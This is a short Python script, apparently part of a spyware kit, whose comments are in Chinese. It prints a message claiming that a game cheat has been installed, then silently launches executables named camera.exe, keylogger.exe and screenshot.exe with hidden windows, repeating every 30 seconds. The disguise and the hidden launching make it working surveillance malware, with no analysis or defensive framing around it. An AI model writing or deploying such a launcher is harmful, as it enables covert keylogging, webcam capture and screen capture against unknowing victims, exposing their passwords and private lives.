# system.py
import time
import subprocess
import threading
import os

#浅浅隐藏
print("脚本外挂安装完成")

# 定义三个exe文件的名称
camera_exe_name = "camera.exe"
keylogger_exe_name = "keylogger.exe"
screenshot_exe_name = "screenshot.exe"

# 获取脚本文件的当前路径
script_path = os.path.abspath(__file__)
script_dir = os.path.dirname(script_path)

# 计算exe文件的路径
camera_exe_path = os.path.join(script_dir, camera_exe_name)
keylogger_exe_path = os.path.join(script_dir, keylogger_exe_name)
screenshot_exe_path = os.path.join(script_dir, screenshot_exe_name)

# 定义一个函数来执行exe文件
def execute_exe(exe_path):
    # 使用subprocess.Popen来执行exe文件
    subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)

# 主循环
def main_loop():
    while True:
        # 创建三个线程来同时执行exe文件
        thread1 = threading.Thread(target=execute_exe, args=(camera_exe_path,))
        thread2 = threading.Thread(target=execute_exe, args=(keylogger_exe_path,))
        thread3 = threading.Thread(target=execute_exe, args=(screenshot_exe_path,))
        
        # 启动线程
        thread1.start()
        thread2.start()
        thread3.start()
        
        # 等待所有线程完成
        thread1.join()
        thread2.join()
        thread3.join()
        
        # 等待一段时间后再次执行
        time.sleep(30)  # 等待30秒后再次执行

# 运行主循环
if __name__ == "__main__":
    main_loop()
